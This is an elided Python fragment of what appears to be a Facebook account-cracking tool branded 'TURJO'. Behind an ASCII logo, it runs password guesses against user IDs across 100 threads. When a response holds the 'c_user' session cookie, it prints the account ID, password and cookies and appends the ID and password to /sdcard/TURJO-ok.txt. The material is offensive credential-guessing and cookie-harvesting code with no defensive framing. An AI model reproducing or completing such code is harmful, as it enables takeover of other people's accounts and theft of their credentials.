...
\033[38;5;46md888888b db    db d8888b.    d88b  .d88b.  
\033[38;5;46m`~~88~~' 88    88 88  `8D    `8P' .8P  Y8. 
\033[38;5;46m   88    88    88 88oobY'     88  88    88 
   \033[38;5;46m88    88    88 88`8b       88  88    88 
  \033[38;5;46m 88    88b  d88 88 `88. db. 88  `8b  d8' 
 \033[38;5;46m  YP    ~Y8888P' 88   YD Y8888P   `Y88P' """
...
def sykology():
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mTURJO-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[TURJO-XD] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[TURJO-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/TURJO-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
